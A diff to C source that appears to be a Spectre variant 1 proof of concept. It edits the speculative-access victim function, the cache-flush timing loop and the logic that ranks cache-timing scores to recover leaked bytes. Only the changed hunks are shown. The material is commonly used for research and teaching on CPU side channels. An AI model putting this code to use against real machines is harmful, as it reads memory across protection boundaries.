@@ -33,7 +33,7 @@ uint8_t tmp = 0;
 
 void victim_function(size_t x) {
     if (x < array1_size) {
-        tmp ^= array2[array1[x] * 512];
+        tmp &= array2[array1[x] * 512];
     }
 }
 
@@ -64,6 +64,8 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
         for (int i = 29; i >= 0; i--) {
             
             _mm_clflush(&array1_size);
+            
+            // Delay a little
             for (volatile int z = 0; z < 100; z++)
                 ;
 
@@ -103,10 +105,10 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
 
         for (int i = 0; i < 256; i++) {
             
-            if (j < 0 || results[i] < results[j]){
+            if (j < 0 || results[i] >= results[j]){
                 k = j;
                 j = i;
-            } else if (k < 0 || results[i] < results[k]) {
+            } else if (k < 0 || results[i] >= results[k]) {
                 k = i;
             }
         }
@@ -159,8 +161,6 @@ int main() {
         
         printf("\n");
     }
-
-    victim_function(2);
 
     return 0;
 }
